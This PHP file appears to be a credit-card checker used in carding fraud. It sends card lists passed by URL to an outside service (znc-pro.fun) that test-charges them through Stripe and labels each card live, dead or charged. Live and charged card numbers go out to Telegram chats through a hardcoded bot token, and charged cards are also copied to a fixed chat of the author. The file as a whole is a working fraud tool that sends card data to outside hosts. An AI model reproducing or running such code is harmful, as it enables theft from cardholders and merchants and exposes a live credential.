<?php


$chat_id ="5126439799";
if(isset( $_GET['tg_id'])){
    $chat_id = $_GET["tg_id"]; 
}

$lista = $_GET['lista'];


 
$url = "http://znc-pro.fun/smex/api/nonsk.php?lista=$lista&amt=0.5&curr=usd&tg_id=5105328367";



$ch = curl_init();

curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
$json_url=curl_exec($ch);


 

 $respo = urlencode($json_url);



//=================== [ RESPONSES ] ===================//
if (preg_match("/GENERIC DECLINED/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECINED</span><br>';
    }elseif (preg_match("/generic_decline/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECINED</span><br>';
    }




elseif (preg_match("/GENERIC DECLINED/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECINED</span><br>';
    }
elseif (preg_match("/generic_decline/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECINED </span><br>';
}
elseif (preg_match("/fund/i", $json_url)){
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS</span><br>';
    
    $yt = "CC => $lista INSUFFICIENT FUNDS by @Im_Kz_T";
 
    $telg = "https://api.telegram.org/bot5410766721:AAGpGY4dD4iJXkFU-mqzH2Ls6PG0h3AVYuQ/sendMessage?chat_id=$chat_id&text=$yt";
    $tgx = curl_init();
curl_setopt($tgx,CURLOPT_URL,$telg);
curl_setopt($tgx,CURLOPT_RETURNTRANSFER,true);
$tgs=curl_exec($tgx);
curl_close($tgx);


  
}elseif (preg_match("/insufficient/i", $json_url)){
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS</span><br>';

    $yt = "CC => $lista  INSUFFICIENT FUNDS by @Im_Kz_T";
   
    $telg = "https://api.telegram.org/bot5410766721:AAGpGY4dD4iJXkFU-mqzH2Ls6PG0h3AVYuQ/sendMessage?chat_id=$chat_id&text=$yt";
    $tgx = curl_init();
curl_setopt($tgx,CURLOPT_URL,$telg);
curl_setopt($tgx,CURLOPT_RETURNTRANSFER,true);
$tgs=curl_exec($tgx);
curl_close($tgx);

}

elseif (preg_match("/fraudulent/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';
}
elseif (preg_match("/BANNED/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result:Automatically Bin Banned</span><br>';
}
elseif (preg_match("/TEST/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Something wring with API : send msg @Im_kz_T</span><br>';
}
elseif (preg_match("/DO NOT HONOR/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
    }

elseif (preg_match("/fraudulent/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';

}elseif (preg_match("/GENERIC DECLINED/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECINED</span><br>';
    }

elseif (preg_match("/incorrect_cvc/i", $json_url)){
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Your card security code incorrect</span><br>';
}
elseif (preg_match("/#CCN/i", $json_url)){
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Your card security code incorrect</span><br>';
     
}
elseif (preg_match("/security/i", $json_url)){
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Your card security code incorrect</span><br>';
     
}
elseif (preg_match("/code/i", $json_url)){
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Your card security code incorrect</span><br>';
     
}
elseif (preg_match("/INCORRECT CARD NUMBER/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Incorrect card number</span><br>';
     
}
elseif (preg_match("/CARD NUMBER/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Incorrect card number</span><br>';
     
}
elseif (preg_match("/maximum/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: You have exceeded the maximum number of declines on this card in the last 24 hour period. Please contact us via https://support.stripe.com/contact if you need further assistance.</span><br>';
}
elseif (preg_match("/honor/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
}
elseif (preg_match("/lost/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span><br>';
}
elseif (preg_match("/stolen/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: STOLEN CARD</span><br>';
    }

elseif (preg_match("/allowed/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: TRANSACTION NOT ALLOWED</span><br>';
    }
    elseif (preg_match("/authentication/i", $json_url)){
    	echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
   } 

elseif (preg_match("/support/i", $json_url)){
    echo '#DIE</span> CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORT THIS TYPE OF PURCHASE</span><br>';
    }


elseif (preg_match("/not_support/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
}
elseif (preg_match("/INCREASE AMOUNT/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCREASE AMOUNT OR TRY ANOTHER CARD : Marchant issue</span><br>';
}
elseif (preg_match("/Too/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
}
elseif (preg_match("/Many/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
}
elseif (preg_match("/request/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
}
elseif (preg_match("/sk/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: API error -  Captcha ⚠️</span><br>';
}
elseif (preg_match("/Warning/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: API error -  Captcha ⚠</span><br>';
}
elseif (preg_match("/NO_SESSION_FOUND/i", $json_url)){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Try again later</span><br>';
}elseif (preg_match("/Charged /i", $json_url)){
echo '<span>#CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $1 Charged ✅ @Im_kZ_T<br>  Receipt : hidden<br>';
    
    $yt = "CC => $lista Donation success ! by @Im_kz_T  ✅";
 

    $telg = "https://api.telegram.org/bot5410766721:AAGpGY4dD4iJXkFU-mqzH2Ls6PG0h3AVYuQ/sendMessage?chat_id=$chat_id&text=$yt";
    $tgx = curl_init();
curl_setopt($tgx,CURLOPT_URL,$telg);
curl_setopt($tgx,CURLOPT_RETURNTRANSFER,true);
$tgs=curl_exec($tgx);
curl_close($tgx);

$my = "https://api.telegram.org/bot5410766721:AAGpGY4dD4iJXkFU-mqzH2Ls6PG0h3AVYuQ/sendMessage?chat_id=5126439799&text=$yt";
   $mys = curl_init();
curl_setopt($mys,CURLOPT_URL,$my);
curl_setopt($mys,CURLOPT_RETURNTRANSFER,true);
$tgsx=curl_exec($mys);
curl_close($mys);
    
}
elseif (preg_match("/CVV /i", $json_url)){
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
 
}

elseif (preg_match("/1 $ /i", $json_url)){
   echo '<span>#CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $1 Charged ✅ @Im_kZ_T<br> ➤ Receipt : hidden<br>';
    $yt = "CC => $lista  Donation success ! by @Im_kz_T ✅";


    $telg = "https://api.telegram.org/bot5410766721:AAGpGY4dD4iJXkFU-mqzH2Ls6PG0h3AVYuQ/sendMessage?chat_id=$chat_id&text=$yt";

    $tgx = curl_init();
curl_setopt($tgx,CURLOPT_URL,$telg);
curl_setopt($tgx,CURLOPT_RETURNTRANSFER,true);
$tgs=curl_exec($tgx);
curl_close($tgx);

$my = "https://api.telegram.org/bot5410766721:AAGpGY4dD4iJXkFU-mqzH2Ls6PG0h3AVYuQ/sendMessage?chat_id=5126439799&text=$yt";
   $mys = curl_init();
curl_setopt($mys,CURLOPT_URL,$my);
curl_setopt($mys,CURLOPT_RETURNTRANSFER,true);
$tgsx=curl_exec($mys);
curl_close($mys);


}
elseif (preg_match("/#CHARGED/i", $json_url)){
    echo '<span>#CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $1 Charged ✅ @Im_kZ_T<br> ➤ Receipt : hidden<br>';
    $yt = "CC => $lista  Donation success ! by @Im_kz_T ✅";

    $telg = "https://api.telegram.org/bot5410766721:AAGpGY4dD4iJXkFU-mqzH2Ls6PG0h3AVYuQ/sendMessage?chat_id=$chat_id&text=$yt";
    $tgx = curl_init();
curl_setopt($tgx,CURLOPT_URL,$telg);
curl_setopt($tgx,CURLOPT_RETURNTRANSFER,true);
$tgs=curl_exec($tgx);
curl_close($tgx);

$my = "https://api.telegram.org/bot5410766721:AAGpGY4dD4iJXkFU-mqzH2Ls6PG0h3AVYuQ/sendMessage?chat_id=5126439799&text=$yt";
   $mys = curl_init();
curl_setopt($mys,CURLOPT_URL,$my);
curl_setopt($mys,CURLOPT_RETURNTRANSFER,true);
$tgsx=curl_exec($mys);
curl_close($mys);
}
else {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: _GENERIC DECLINED_</span><br>';
   
   
      
}
curl_close($ch);
ob_flush();
